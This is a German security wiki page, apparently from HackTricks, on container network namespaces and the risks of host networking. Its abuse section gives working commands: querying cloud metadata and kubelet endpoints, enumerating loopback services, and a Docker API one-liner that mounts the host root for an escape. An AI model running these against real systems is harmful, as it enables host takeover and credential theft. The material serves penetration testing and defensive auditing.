# Netzwerk-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der Netzwerk-Namespace isoliert netzwerkbezogene Ressourcen wie Schnittstellen, IP-Adressen, Routing-Tabellen, ARP-/Nachbarstatus, Firewall-Regeln, Sockets, den abstrakten UNIX-Domain-Socket-Namespace sowie den Inhalt von Dateien wie `/proc/net`.<sup>[[2]](#references)</sup> Deshalb kann ein Container scheinbar über ein eigenes `eth0`, eigene lokale Routen und ein eigenes Loopback-Device verfügen, ohne den tatsächlichen Netzwerk-Stack des Hosts zu besitzen.

Aus Sicherheitssicht ist dies wichtig, weil Netzwerkisolation weit über das Binden von Ports hinausgeht. Ein privater Netzwerk-Namespace beschränkt, was die Workload direkt beobachten oder rekonfigurieren kann. Sobald dieser Namespace mit dem Host geteilt wird, kann der Container plötzlich Einblick in Listener des Hosts, lokale Dienste des Hosts, abstrakte AF_UNIX-Endpunkte und Netzwerk-Kontrollpunkte erhalten, die niemals für die Anwendung offengelegt werden sollten.

## Funktionsweise

Ein frisch erstellter Netzwerk-Namespace beginnt mit einer leeren oder nahezu leeren Netzwerkumgebung, bis Schnittstellen an ihn angebunden werden. Container-Runtimes erstellen oder verbinden anschließend virtuelle Schnittstellen, weisen Adressen zu und konfigurieren Routen, damit die Workload über die erwartete Konnektivität verfügt. Bei bridge-basierten Deployments sieht der Container normalerweise eine veth-gestützte Schnittstelle, die mit einer Host-Bridge verbunden ist. In Kubernetes übernehmen CNI-Plugins die entsprechende Einrichtung für das Pod-Netzwerk.

Diese Architektur erklärt, warum `--network=host` oder `hostNetwork: true` eine so gravierende Änderung darstellt. Statt einen vorbereiteten privaten Netzwerk-Stack zu erhalten, tritt die Workload dem tatsächlichen Netzwerk-Stack des Hosts bei.

## Labor

Mit Folgendem kannst du einen nahezu leeren Netzwerk-Namespace anzeigen:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Und Sie können normale Container und Container mit Host-Netzwerk vergleichen mit:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Der host-networked Container verfügt nicht mehr über eine eigene isolierte Ansicht der Sockets und Interfaces. Allein diese Änderung ist bereits erheblich, bevor man überhaupt fragt, über welche Capabilities der Prozess verfügt.

## Laufzeitverwendung

Docker und Podman erstellen normalerweise für jeden Container einen privaten Network Namespace, sofern dies nicht anders konfiguriert wurde. Kubernetes weist jedem Pod normalerweise einen eigenen Network Namespace zu, der von den Containern innerhalb dieses Pods gemeinsam genutzt wird, jedoch vom Host getrennt ist. Das bedeutet, dass `127.0.0.1` normalerweise Pod-lokal statt container-lokal ist: Ein Listener, der nur an localhost gebunden ist, ist in einem Container typischerweise von dessen Sidecars und Geschwistern aus erreichbar. Incus/LXC-Systeme bieten ebenfalls eine umfangreiche Isolation auf Basis von Network Namespaces, häufig mit einer größeren Vielfalt virtueller Networking-Setups.

Das gemeinsame Prinzip ist, dass privates Networking standardmäßig die Isolationsgrenze bildet, während Host-Networking ein explizites Opt-out von dieser Grenze ist.

## Fehlkonfigurationen

Die wichtigste Fehlkonfiguration besteht schlicht darin, den Network Namespace des Hosts gemeinsam zu verwenden. Dies geschieht manchmal aus Performance-Gründen, für Low-Level-Monitoring oder aus Bequemlichkeit, entfernt jedoch eine der saubersten verfügbaren Grenzen für Container. Host-lokale Listener werden auf direktere Weise erreichbar, nur an localhost gebundene Services können zugänglich werden, und Capabilities wie `CAP_NET_ADMIN` oder `CAP_NET_RAW` werden deutlich gefährlicher, da die von ihnen ermöglichten Operationen nun auf die eigene Netzwerkumgebung des Hosts angewendet werden.

Ein weiteres Problem ist die übermäßige Vergabe von netzwerkbezogenen Capabilities, selbst wenn der Network Namespace privat ist. Ein privater Namespace bietet zwar Schutz, macht Raw Sockets oder fortgeschrittene Netzwerkkontrolle jedoch nicht harmlos.

In Kubernetes verändert `hostNetwork: true` außerdem, wie viel Vertrauen man in die Netzwerksegmentierung auf Pod-Ebene setzen kann. Kubernetes dokumentiert, dass viele Network Plugins den Traffic von `hostNetwork`-Pods bei der Zuordnung über `podSelector` / `namespaceSelector` nicht korrekt unterscheiden können und ihn daher wie gewöhnlichen Node-Traffic behandeln.<sup>[[1]](#references)</sup> Aus Sicht eines Angreifers bedeutet das, dass eine kompromittierte `hostNetwork`-Workload häufig eher als Netzwerk-Foothold auf Node-Ebene betrachtet werden sollte und nicht als normaler Pod, der weiterhin denselben Policy-Annahmen unterliegt wie Workloads im Overlay-Netzwerk.

## Missbrauch

In schwach isolierten Setups können Angreifer Listening-Services des Hosts untersuchen, Management-Endpunkte erreichen, die nur an die Loopback-Schnittstelle gebunden sind, Traffic abhängig von den konkreten Capabilities und der Umgebung sniffen oder beeinflussen oder Routing- und Firewall-Zustände neu konfigurieren, wenn `CAP_NET_ADMIN` vorhanden ist. In einem Cluster kann dies außerdem laterale Bewegungen und die Reconnaissance der Control Plane erleichtern.

Wenn du Host-Networking vermutest, bestätige zunächst, dass die sichtbaren Interfaces und Listener zum Host gehören und nicht zu einem isolierten Container-Netzwerk:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Dienste, die nur über Loopback erreichbar sind, sind oft die erste interessante Entdeckung:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstrakte UNIX-Sockets sind ein weiteres leicht zu übersehendes Ziel, da sie auf den Network Namespace beschränkt sind, obwohl sie nicht wie TCP/UDP-Listener aussehen und möglicherweise nicht als Dateisystempfade unter `/run` existieren. Ein Container mit Host-Netzwerk kann daher Zugriff auf ausschließlich auf dem Host vorhandene Control Channels erben, die überhaupt nicht in den Container eingebunden wurden:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Ein historisches Beispiel war der Fehler bei der Offenlegung des abstrakten `containerd-shim`-Sockets, aber die übergeordnete Erkenntnis ist wichtiger als die spezifische CVE: Sobald ein Workload dem Netzwerk-Namespace des Hosts beitritt, gehören auch abstrakte AF_UNIX-Dienste zur Angriffsfläche.<sup>[[3]](#references)</sup> Wenn diese Sockets nach Runtime- oder administrativen Diensten aussehen, wechsle zu [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Wenn Netzwerk-Capabilities vorhanden sind, teste, ob der Workload den sichtbaren Stack untersuchen oder verändern kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Auf modernen Kernels kann Host networking zusammen mit `CAP_NET_ADMIN` auch den Paketpfad über einfache Änderungen an `iptables` / `nftables` hinaus offenlegen. `tc`-qdiscs und Filter sind ebenfalls namespace-scoped und wirken daher in einem gemeinsam genutzten Host-Netzwerk-Namespace auf die Host-Interfaces, die der Container sehen kann. Ist zusätzlich `CAP_BPF` vorhanden, werden auch netzwerkbezogene eBPF-Programme wie TC- und XDP-Loader relevant:<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Dies ist relevant, weil ein Angreifer möglicherweise Traffic auf Ebene des Host-Interfaces spiegeln, umleiten, formen oder verwerfen kann und nicht nur Firewall-Regeln umschreiben kann. In einem privaten Network Namespace sind diese Aktionen auf die Sicht des Containers beschränkt; in einem gemeinsam genutzten Host Namespace wirken sie sich auf den Host aus.

In Cluster- oder Cloud-Umgebungen rechtfertigt Host-Networking außerdem eine schnelle lokale Recon von Metadaten und control-plane-nahen Diensten:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
In Kubernetes gilt: Denke daran, dass die Kompromittierung **jedes** Containers in einem Pod mit mehreren Containern ebenfalls Zugriff auf die von benachbarten Containern und Sidecars geöffneten localhost-Listener ermöglicht, da der gesamte Pod einen gemeinsamen network namespace verwendet. Dies ist besonders relevant bei service-mesh-, Observability- und Helper-Containern, deren Admin- oder Debug-Schnittstellen absichtlich nur innerhalb des Pods und nicht clusterweit erreichbar sind:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Behandle „an localhost gebunden“ als **Pod-intern**, nicht als **container-intern**. Sobald ein Container im Pod kompromittiert wurde, ist diese Annahme hinfällig.

### Vollständiges Beispiel: Host-Netzwerk + Zugriff auf lokale Runtime / Kubelet

Host-Netzwerk stellt nicht automatisch Root-Rechte auf dem Host bereit, legt aber häufig Services offen, die absichtlich nur vom Node selbst erreichbar sind. Wenn einer dieser Services nur schwach geschützt ist, wird das Host-Netzwerk zu einem direkten Pfad zur Privilege Escalation.

Docker API auf localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet auf localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Auswirkungen:

- direkte Kompromittierung des Hosts, wenn eine lokale Runtime-API ohne angemessenen Schutz offengelegt ist
- Aufklärung des Clusters oder laterale Bewegung, wenn kubelet oder lokale Agents erreichbar sind
- Manipulation des Datenverkehrs oder Denial of Service in Kombination mit `CAP_NET_ADMIN`

## Prüfungen

Ziel dieser Prüfungen ist es festzustellen, ob der Prozess über einen privaten Netzwerk-Stack verfügt, welche Routen und Listener sichtbar sind und ob die Netzwerksicht bereits hostähnlich wirkt, bevor du überhaupt Capabilities testest.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Was hier interessant ist:

- Wenn `/proc/self/ns/net` und `/proc/1/ns/net` bereits host-ähnlich aussehen, verwendet der Container möglicherweise den Netzwerk-Namespace des Hosts oder einen anderen nicht privaten Namespace.
- `lsns -t net` und `ip netns identify` sind nützlich, wenn sich die Shell bereits innerhalb eines benannten oder persistenten Namespace befindet und du ihn mit `/run/netns`-Objekten von der Host-Seite aus korrelieren möchtest.
- `ss -lntup` ist besonders wertvoll, da dieser Befehl ausschließlich an Loopback gebundene Listener und lokale Management-Endpunkte sichtbar macht. `ss -xap` und `/proc/net/unix` ergänzen die Ansicht abstrakter Sockets, die bei gewöhnlichen Suchen nach Sockets im Dateisystem nicht erfasst werden.
- Routen, Interface-Namen, Firewall-Kontext, `tc`-Zustand und eBPF-Attachments werden deutlich wichtiger, wenn `CAP_NET_ADMIN`, `CAP_NET_RAW` oder `CAP_BPF` vorhanden ist.
- In Kubernetes kann eine fehlgeschlagene Service-Namensauflösung von einem `hostNetwork`-Pod einfach bedeuten, dass der Pod nicht `dnsPolicy: ClusterFirstWithHostNet` verwendet, und nicht, dass der Service fehlt.
- In Pods mit mehreren Containern gehören Listener auf localhost zum gesamten Pod-Netzwerk-Namespace. Prüfe daher Sidecars und Schwestercontainer, bevor du annimmst, dass ein ausschließlich an Loopback gebundener Port vom kompromittierten Container aus nicht erreichbar ist.

Bei der Untersuchung eines Containers solltest du den Netzwerk-Namespace immer zusammen mit dem Capability-Set bewerten. Host-Networking mit starken Netzwerk-Capabilities stellt eine völlig andere Sicherheitslage dar als Bridge-Networking mit einem eingeschränkten Standard-Capability-Set.

## Referenzen

- [1] [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [Linux `network_namespaces(7)` and abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [containerd advisory: abstract Unix domain sockets exposed to host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
